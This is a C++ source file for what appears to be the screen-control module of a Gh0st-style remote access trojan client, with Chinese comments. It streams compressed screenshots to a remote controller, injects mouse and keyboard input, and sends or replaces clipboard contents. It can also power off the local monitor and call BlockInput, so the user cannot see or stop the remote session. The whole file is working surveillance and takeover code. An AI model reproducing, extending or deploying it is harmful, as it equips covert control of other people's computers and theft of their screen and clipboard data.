// ScreenManagers.cpp: implementation of the CScreenDifManager class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "ScreenDifManager.h"
#include <WinUser.h>  

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CScreenDifManager::CScreenDifManager(ISocketBase* pClient) :CManager(pClient)
{
	
	m_buser = FALSE;
	m_biBitCount = 8;
	m_fps = 1;
	m_pScreenSpy = new CScreenSpy(m_biBitCount,false, m_fps);
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;
	m_hDeskTopDC = GetDC(GetDesktopWindow());
	m_oldwidth = ::GetSystemMetrics(SM_CXVIRTUALSCREEN);
	m_oldheigh = ::GetSystemMetrics(SM_CYVIRTUALSCREEN);
	m_MYtagMSG = nullptr;
	m_MYtagMSGsize = sizeof(MYtagMSG);
	
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);
	m_hBlankThread = (HANDLE)_beginthreadex(NULL, 0, ControlThread, this, 0, NULL);
	m_buser = TRUE;
}

CScreenDifManager::~CScreenDifManager()
{
	if (!m_buser) return;
	m_oldwidth = 0;
	m_oldheigh = 0;
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, false);
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hBlankThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hBlankThread);
	ReleaseDC(NULL, m_hDeskTopDC);
	SAFE_DELETE(m_pScreenSpy);

}

void CScreenDifManager::ResetScreen(int biBitCount)
{
	Trace("~ResetScreen--------\n");
	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	delete m_pScreenSpy;

	if (biBitCount == 3)		// 4位灰度
		m_pScreenSpy = new CScreenSpy(4, true);
	else if (biBitCount == 7)	// 8位灰度
		m_pScreenSpy = new CScreenSpy(8, true);
	else
		m_pScreenSpy = new CScreenSpy(biBitCount);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
	m_pScreenSpy->SetFps(m_fps);
	m_biBitCount = biBitCount;

	//	m_bIsWorking = true;
	m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, WorkThread, this, 0, NULL);


}

void CScreenDifManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	try
	{
		if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
		switch (lpBuffer[0])
		{
		case COMMAND_SCREEN_CONTROL_DIF:
		{
			if (m_bIsBlockInput)
				BlockInput(FALSE);       // 远程仍然可以操作
			ProcessCommand(lpBuffer + 1, nSize - 1);
			if (m_bIsBlockInput)
				BlockInput(m_bIsBlockInput);
		}
		break;
		case COMMAND_NEXT_DIF:
			// 通知内核远程控制端对话框已打开，WaitForDialogOpen可以返回
			NotifyDialogIsOpen();
			break;
		case COMMAND_SCREEN_RESET_DIF:
			ResetScreen(*(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_SCREEN_FPS_DIF:
		{
			m_fps = (int)(*(LPBYTE)&lpBuffer[1]);
			m_pScreenSpy->SetFps(m_fps);
		}	
			break;
		case COMMAND_SCREEN_BLOCK_INPUT_DIF: //ControlThread里锁定
			InterlockedExchange((LPLONG)&m_bIsBlockInput, *(LPBYTE)&lpBuffer[1]);
			BlockInput(m_bIsBlockInput);
			break;
		case COMMAND_SCREEN_BLANK_DIF:
			InterlockedExchange((LPLONG)&m_bIsBlankScreen, *(LPBYTE)&lpBuffer[1]);
			break;
		case COMMAND_SCREEN_CAPTURE_LAYER_DIF:
			memcpy(&m_bIsCaptureLayer, lpBuffer + 1, sizeof(bool));
			m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
			break;
		case COMMAND_SCREEN_GET_CLIPBOARD_DIF:
			SendLocalClipboard();
			break;
		case COMMAND_SCREEN_SET_CLIPBOARD_DIF:
			UpdateLocalClipboard((char*)lpBuffer + 1, nSize - 1);
			break;
		default:
			Trace("OnReceive default--------\n");
			break;
		}
	}
	catch (...) {}
}

void CScreenDifManager::sendBITMAPINFO()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	lpBuffer[0] = TOKEN_BITMAPINFO_DIF;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
}

void CScreenDifManager::sendsize()
{
	RECT m_rect;
	m_rect.left = m_pScreenSpy->iScreenX;
	m_rect.top = m_pScreenSpy->iScreenY;
	m_rect.right = m_pScreenSpy->m_nFullWidth;
	m_rect.bottom = m_pScreenSpy->m_nFullHeight;
	LPBYTE	lpBuffer = new BYTE[sizeof(RECT) + 1];
	lpBuffer[0] = TOKEN_SIZE_DIF;
	memcpy(lpBuffer + 1, &m_rect, sizeof(RECT));
	Send(lpBuffer, sizeof(RECT) + 1);
	SAFE_DELETE_AR(lpBuffer);
}

void CScreenDifManager::sendFirstScreen()
{
	BOOL	bRet = false;
	LPVOID	lpFirstScreen = NULL;

	lpFirstScreen = m_pScreenSpy->getFirstScreen();
	if (lpFirstScreen == NULL)
		return;
	int dwBytes = m_pScreenSpy->getFirstImageSize();
	unsigned long	destLen = (unsigned long)((double)dwBytes * 1.001 + 12);
	LPBYTE			pDest = new BYTE[destLen];
	if (pDest == NULL) 		return;
	if (compress(pDest, &destLen, (byte*)lpFirstScreen, dwBytes) != Z_OK)
	{
		SAFE_DELETE_AR(pDest);
		return;
	}
	DWORD	dwBytesLength = 1 + destLen+4;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	lpBuffer[0] = TOKEN_FIRSTSCREEN_DIF;
	memcpy(lpBuffer + 1,&dwBytes, 4);
	memcpy(lpBuffer +5, pDest, destLen);
	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
	SAFE_DELETE_AR(pDest);
}

void CScreenDifManager::sendNextScreen()
{
	LPVOID	lpNetScreen = NULL;
	DWORD	dwBytes;
	lpNetScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	if (dwBytes == 0 || !lpNetScreen)
		return;
	unsigned long	destLen = (unsigned long)((double)dwBytes * 1.001 + 12);
	LPBYTE			pDest = new BYTE[destLen];
	if (pDest == NULL) 		return;
	if (compress(pDest, &destLen, (byte*)lpNetScreen, dwBytes) != Z_OK)
	{
		SAFE_DELETE_AR(pDest);
		return;
	}
	DWORD	dwBytesLength = 1 + destLen+4;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (!lpBuffer)
		return;
	lpBuffer[0] = TOKEN_NEXTSCREEN_DIF;
	memcpy(lpBuffer + 1, &dwBytes, 4);
	memcpy(lpBuffer + 5, (const char*)pDest, destLen);

	Send(lpBuffer, dwBytesLength);
	SAFE_DELETE_AR(lpBuffer);
	SAFE_DELETE_AR(pDest);
}

unsigned CScreenDifManager::WorkThread(LPVOID lparam)
{
	CScreenDifManager* pThis = (CScreenDifManager*)lparam;

	pThis->sendBITMAPINFO();
	// 等控制端对话框打开
	if (pThis->m_bIsWorking) 	pThis->WaitForDialogOpen();
	pThis->sendsize();
	pThis->sendFirstScreen();
	pThis->m_bIsWorking = true;
		while (pThis->m_bIsWorking)
		{
			pThis->sendNextScreen();
		}
	return 0;
}

// 创建这个线程主要是为了保持一直黑屏
unsigned CScreenDifManager::ControlThread(LPVOID lparam)
{
	static bool bIsScreenBlanked = false;
	CScreenDifManager* pThis = (CScreenDifManager*)lparam;
	pThis->WaitForDialogOpen();

	while (pThis->IsConnect())
	{
		// 分辨率大小改变了
		if (pThis->IsMetricsChange() && pThis->m_bIsWorking)
		{
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
		}
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
			BlockInput(TRUE);
	
			
		}
		else if (bIsScreenBlanked)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
			PostMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			bIsScreenBlanked = false;
			BlockInput(FALSE);
		}
		Sleep(200);
	}
	BlockInput(FALSE);
	return 0;
}

#if !defined(GET_WHEEL_DELTA_WPARAM)
#define GET_WHEEL_DELTA_WPARAM(wParam) ((short)HIWORD(wParam))
#endif

void CScreenDifManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{

	if (nSize % m_MYtagMSGsize != 0)
		return;

	m_pScreenSpy->SwitchInputDesktop();

	
		BlockInput(false);
		m_MYtagMSG = (MYtagMSG*)lpBuffer;

		DWORD dx = (DWORD)(65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES) - 1) * m_MYtagMSG->x);
		DWORD dy = (DWORD)(65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES) - 1) * m_MYtagMSG->y);

		switch (m_MYtagMSG->message)
		{
		case WM_MOUSEMOVE:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN, dx, dy, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN, dx, dy, 0, 0);
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_RIGHTDOWN | MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN, dx, dy, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MIDDLEDOWN | MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_WHEEL, dx, dy, GET_WHEEL_DELTA_WPARAM((UINT)(m_MYtagMSG->wParam)), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			if ((UINT)(m_MYtagMSG->wParam) == VK_LEFT || (UINT)(m_MYtagMSG->wParam) == VK_RIGHT || (UINT)(m_MYtagMSG->wParam) == VK_UP || (UINT)(m_MYtagMSG->wParam) == VK_DOWN)
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_EXTENDEDKEY, 0);
			else
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			if ((UINT)(m_MYtagMSG->wParam) == VK_LEFT || (UINT)(m_MYtagMSG->wParam) == VK_RIGHT || (UINT)(m_MYtagMSG->wParam) == VK_UP || (UINT)(m_MYtagMSG->wParam) == VK_DOWN)
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
			else
				keybd_event((UINT)(m_MYtagMSG->wParam), MapVirtualKey((UINT)(m_MYtagMSG->wParam), 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
}

void CScreenDifManager::UpdateLocalClipboard(char* buf, int len)
{
	if (!::OpenClipboard(GetDesktopWindow()))
		return;

	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len+10);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void CScreenDifManager::SendLocalClipboard()
{
	if (!::OpenClipboard(GetDesktopWindow()))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = int(GlobalSize(hglb)) + 2;
	LPSTR lpstr = (LPSTR)GlobalLock(hglb);
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_CLIPBOARD_TEXT_DIF;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb);
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;

}


// 屏幕分辨率是否发生改变
bool CScreenDifManager::IsMetricsChange()
{
	if ((m_oldwidth != ::GetSystemMetrics(SM_CXVIRTUALSCREEN)) || (m_oldheigh != ::GetSystemMetrics(SM_CYVIRTUALSCREEN)))
	{
		if (m_oldwidth == 0 || m_oldheigh == 0)
		{
			return false;
		}
		m_oldwidth = ::GetSystemMetrics(SM_CXVIRTUALSCREEN);
		m_oldheigh = ::GetSystemMetrics(SM_CYVIRTUALSCREEN);
		return true;
	}

	return false;
}

bool CScreenDifManager::IsConnect()
{
	return (m_pClient->IsRunning()) ? true : false;
}

int CScreenDifManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}

